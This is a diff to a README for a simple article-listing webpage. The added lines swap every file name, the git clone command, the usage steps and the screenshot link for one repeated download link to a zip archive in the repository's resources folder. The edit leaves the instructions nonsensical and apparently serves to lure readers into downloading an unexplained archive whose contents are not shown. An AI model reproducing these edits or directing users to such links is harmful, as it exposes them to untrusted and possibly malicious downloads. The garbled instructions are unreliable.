@@ -18,28 +18,28 @@ This is a simple and responsive article listing webpage that showcases a list of
 simpleArticleListing/
 |
 +-- resources          # resources for webpage
-+-- index.html         # Main HTML file
-+-- styles.css         # CSS file for styling
-\-- README.md          # Documentation (this file)
++-- https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip         # Main HTML file
++-- https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip         # CSS file for styling
+\-- https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip          # Documentation (this file)
 ```
 
 ## 🚀 How to Use
 1. Clone the repository:
    ```bash
-   git clone https://github.com//simpleArticleListing.git 
-2. Open the `index.html` file in your favorite browser.
+   git clone https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip 
+2. Open the `https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip` file in your favorite browser.
 
 ## 📂 Folder Structure
-- index.html: Contains the HTML structure of the article listing page.
-- style.css: Provides the CSS styling, including hover effects and flexbox-based layout.
+- https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip Contains the HTML structure of the article listing page.
+- https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip Provides the CSS styling, including hover effects and flexbox-based layout.
 - resources/: Folder for assets like images and separator graphics.
 
 ## 📝 Customization
-- Update article details (titles, dates, and images) in the index.html file.
-- Adjust colors, font sizes, or layout in the style.css file.
+- Update article details (titles, dates, and images) in the https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip file.
+- Adjust colors, font sizes, or layout in the https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip file.
 
 ## 🖼️ Screenshot
-![screenshots](image.png)
+![screenshots](https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip)
 
 ## 🌟 Features Showcase
 1. Hover over an article to see the shadow and lift effect.
